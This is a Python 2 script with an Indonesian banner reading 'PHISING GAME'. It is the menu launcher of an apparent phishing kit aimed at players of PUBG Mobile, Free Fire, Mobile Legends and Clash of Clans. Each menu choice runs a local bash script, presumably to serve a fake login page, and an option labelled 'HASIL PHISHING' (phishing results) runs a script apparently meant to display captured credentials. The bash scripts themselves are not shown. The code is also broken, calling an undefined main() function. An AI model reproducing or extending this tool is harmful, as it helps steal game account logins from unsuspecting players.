import os
import sys
import time
import random
import cookielib
import mechanize
wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def tik(bacot):
    for meizu in bacot + '\n':
        sys.stdout.write(meizu)
        sys.stdout.flush()
        time.sleep(random.random() * 0.2)

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)

def banner():
    os.system('clear')
    runntxt(GL+ "  ___    ___ ")
    runntxt(GL+" ( _<    >_ ) ")
    runntxt(GL+" //        \\\ ")
    runntxt(GL+" \\\___..___// ")
    runntxt(GL+"  `-(    )-'          \033[0;1m [ \033[31mPHISING GAME  \033[0;1m] ")
    runntxt(GL+"    _|__|_ ")
    runntxt(GL+"   /_|__|_\    \033[33;1m* \033[36;1mAuthor  : \033[32m RidwanKechil ")
    runntxt(GL+"   /_|__|_\    \033[33;1m* \033[36;1minstagram :\033[32m Wibi&Ridwan ")
    runntxt(GL+"   /_\__/_\    \033[90;1m=================================> ")
    runntxt(GL+"    \ || / _)")
    runntxt(GL+"      ||  ( )")
    runntxt(GL+"      \\___//")
    runntxt(GL+"      `---'")
time.sleep(1.5)
banner()

tik (Y+"* \033[0;1mPESAN : \033[31mGUNAKAN DENGAN BIJAK")
tik (W+"================================")
print (" [\033[34m1\033[0;1m]. PUBG MOBILE")
print (" [\033[34m2\033[0;1m]. FREEFIRE") 
print (" [\033[34m3\033[0;1m]. MOBILE LEGENDS")
print (" [\033[34m4\033[0;1m]. CLASH OF CLANS")
print (" [\033[34m5\033[0;1m].\033[31m UPDATE")
print (" \033[0;1m===============================")
print (" [\033[34m00\033[0;1m]. HASIL PHISHING")
print




class Main:
    pilihan = str(raw_input(W+" [\033[32m?\033[0;1m]. MASUKAN PILIHAN JANGAN LUPA SUBS RidwanKechil : "))
    if pilihan == '1' or pilihan == '01':
        os.system("bash manggil1.sh")
    if pilihan == '2' or pilihan == '02':
           os.system("bash manggil2.sh")
    if pilihan == '3' or pilihan == '03':
             os.system("bash manggil3.sh")
    if pilihan == '4' or pilihan == '04':
               os.system("bash manggil4.sh")
    if pilihan == '0' or pilihan == '00':
                  os.system("bash dcim.sh")
                  print ("      \033[32mMENUNGGU...")
    else:
     tik (R+"      TERIMAKASIH SUDAH BERKUNJUNG !!! ")

main()
